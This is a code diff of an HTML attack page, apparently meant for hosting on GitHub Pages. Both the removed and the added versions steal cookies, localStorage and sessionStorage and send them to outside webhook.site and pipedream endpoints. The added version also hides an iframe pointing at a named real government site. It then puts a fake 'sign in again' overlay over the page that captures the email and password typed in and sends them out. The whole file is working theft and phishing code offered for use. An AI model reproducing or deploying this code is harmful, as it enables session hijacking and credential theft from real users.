@@ -1,25 +1,54 @@
-<!DOCTYPE html>
-<html>
-  <head>
-    <meta charset="UTF-8">
-    <title>Stealth Data Exfiltration</title>
-    <script>
-      const data = {
-        cookie: document.cookie,
-        local: JSON.stringify(localStorage),
-        session: JSON.stringify(sessionStorage),
-        agent: navigator.userAgent,
-        href: location.href,
-        ref: document.referrer,
-        lang: navigator.language,
-        time: new Date().toISOString()
-      };
+<!-- attack.html - ارفع هذا في GitHub Pages -->
+<script>
+(async () => {
+  const data = {
+    location: window.location.href,
+    hash: location.hash,
+    search: location.search,
+    referrer: document.referrer,
+    cookie: document.cookie,
+    localStorage: JSON.stringify(localStorage),
+    sessionStorage: JSON.stringify(sessionStorage),
+    userAgent: navigator.userAgent,
+    origin: location.origin
+  };
 
-      const payload = encodeURIComponent(JSON.stringify(data));
+  // حقن iframe لمحاولة الوصول من خلال DOM لبيانات حساسة
+  const iframe = document.createElement('iframe');
+  iframe.src = "https://dataentrydev.globe.gov/";
+  iframe.style.display = "none";
+  document.body.appendChild(iframe);
 
-      // 🚀 Guaranteed no preflight (GET via img)
-      new Image().src = "https://webhook.site/29f5b779-2540-4657-a365-bc504ee5c1de?data=" + payload;
-    </script>
-  </head>
-  <body></body>
-</html>
+  // إرسال البيانات إلى Pipedream أو Webhook.site
+  await fetch("https://eoat1elxcyeymir.m.pipedream.net", {
+    method: "POST",
+    headers: {"Content-Type": "application/json"},
+    body: JSON.stringify({ type: "XSS-Data", ...data })
+  });
+
+  // Fake login overlay (اختياري)
+  const overlay = document.createElement('div');
+  overlay.innerHTML = `
+    <div style="position:fixed;top:0;left:0;width:100%;height:100%;
+                background:#fff;z-index:9999;display:flex;align-items:center;
+                justify-content:center;flex-direction:column">
+      <h2>Please sign in again</h2>
+      <input id="user" placeholder="Email" style="margin:5px;padding:10px" />
+      <input id="pass" placeholder="Password" type="password" style="margin:5px;padding:10px" />
+      <button onclick="sendCreds()">Login</button>
+    </div>`;
+  document.body.appendChild(overlay);
+
+  window.sendCreds = () => {
+    const creds = {
+      email: document.getElementById('user').value,
+      password: document.getElementById('pass').value
+    };
+    fetch("https://eoat1elxcyeymir.m.pipedream.net", {
+      method: "POST",
+      headers: {"Content-Type": "application/json"},
+      body: JSON.stringify({ type: "creds", ...creds })
+    });
+  };
+})();
+</script>
